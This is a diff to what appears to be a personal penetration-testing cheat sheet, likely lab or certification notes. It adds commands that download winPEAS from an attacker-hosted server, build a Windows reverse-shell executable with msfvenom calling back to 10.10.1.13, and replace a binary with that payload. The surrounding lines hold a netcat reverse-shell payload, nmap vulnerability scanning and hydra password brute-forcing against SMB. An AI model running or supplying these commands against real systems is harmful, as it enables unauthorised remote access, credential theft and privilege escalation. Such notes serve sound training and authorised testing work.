@@ -10,7 +10,7 @@ snow -C -p "password" res.txt
 
 python -m SimpleHTTPServer 9000
 python3 -m http.server 9000
-
+wget http://10.10.1.13:9000/winPEASx64.exe -o winpeas.exe
 SMB -->
 sudo nmap -T4 -Ss -p 139,445 - -script vuln 192.166.0.0/24
 hydra-l henry -P /home/passlist.txt 192.168.0.1 smb
@@ -28,6 +28,8 @@ telnet 192.168.0.1
 msfvenom -p cmd/unix/reverse_netcat LHOST=<your_ip> LPORT=444
 nc -lnvp 444
 
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe >/root/ADtools/file.exe
+move file.exe file.bak ;wget http://10.10.1.13:8000/file.exe -o file.exe
 find / -name find.txt 2>/dev/null
 
 ssh <username>@192.168.0.1
